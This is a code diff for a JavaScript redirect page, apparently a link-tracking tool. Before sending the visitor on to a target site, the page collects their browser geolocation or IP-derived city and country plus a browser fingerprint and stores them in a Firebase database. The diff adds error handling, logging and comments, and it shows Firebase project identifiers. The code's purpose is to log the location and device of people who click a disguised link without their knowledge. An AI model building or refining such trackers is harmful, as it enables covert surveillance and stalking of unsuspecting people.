@@ -17,7 +17,8 @@
       projectId: "jarsi-df353",
       storageBucket: "jarsi-df353.appspot.com",
       messagingSenderId: "488797085147",
-      appId: "1:488797085147:web:52108c710556a39f62dbfe"
+      appId: "1:488797085147:web:52108c710556a39f62dbfe",
+      measurementId: "G-J2Y7F4N6VW"
     };
 
     firebase.initializeApp(firebaseConfig);
@@ -28,6 +29,7 @@
     const target = urlParams.get('target');
     const trackingId = urlParams.get('id');
 
+    // Redirect if missing params
     if (!target || !trackingId) {
       window.location.href = 'lacak.html';
     } else {
@@ -45,7 +47,7 @@
         deviceId: generateDeviceId()
       };
 
-      // Set timeout for redirect (max 3 seconds)
+      // Set timeout for entire process (max 3 seconds)
       const redirectTimeout = setTimeout(() => {
         performRedirect(target);
       }, 3000);
@@ -59,7 +61,8 @@
             trackingData.locationSource = 'geolocation';
             getIPAndSave(trackingData, redirectTimeout, target);
           },
-          () => {
+          (error) => {
+            console.log('Geolocation error:', error);
             trackingData.locationSource = 'ip-fallback';
             getIPAndSave(trackingData, redirectTimeout, target);
           },
@@ -71,9 +74,13 @@
       }
     }
 
+    // Helper function to get IP-based location
     function getIPAndSave(trackingData, redirectTimeout, target) {
       fetch('https://ipapi.co/json/')
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) throw new Error('IP API response not OK');
+          return response.json();
+        })
         .then(ipData => {
           trackingData.ip = ipData.ip || 'Unknown';
           trackingData.city = ipData.city || 'Unknown';
@@ -87,33 +94,41 @@
           
           saveToFirebase(trackingData, redirectTimeout, target);
         })
-        .catch(() => {
+        .catch(error => {
+          console.log('IP API error:', error);
           trackingData.ip = 'Unknown';
           trackingData.city = 'Unknown';
           trackingData.region = 'Unknown';
           trackingData.country = 'Unknown';
+          if (!trackingData.latitude) {
+            trackingData.latitude = 'Unknown';
+            trackingData.longitude = 'Unknown';
+          }
           saveToFirebase(trackingData, redirectTimeout, target);
         });
     }
 
+    // Save data to Firebase
     function saveToFirebase(trackingData, redirectTimeout, target) {
       const logRef = database.ref('logs/' + trackingData.id + '_' + Date.now());
       
       logRef.set(trackingData)
         .then(() => {
+          console.log('Tracking data saved');
           clearTimeout(redirectTimeout);
           performRedirect(target);
         })
-        .catch(() => {
+        .catch(error => {
+          console.error('Error saving to Firebase:', error);
           clearTimeout(redirectTimeout);
           performRedirect(target);
         });
     }
 
+    // Perform the actual redirect
     function performRedirect(targetUrl) {
       let finalUrl = targetUrl;
       
-      // Add https:// if missing
       if (!/^https?:\/\//i.test(targetUrl)) {
         finalUrl = 'https://' + targetUrl;
       }
@@ -121,6 +136,7 @@
       window.location.href = finalUrl;
     }
 
+    // Generate device ID
     function generateDeviceId() {
       const components = [
         navigator.userAgent,
@@ -131,8 +147,10 @@
       ];
       
       let hash = 0;
-      for (let i = 0; i < components.join('|').length; i++) {
-        const char = components.join('|').charCodeAt(i);
+      const str = components.join('|');
+      
+      for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
         hash = (hash << 5) - hash + char;
         hash |= 0;
       }
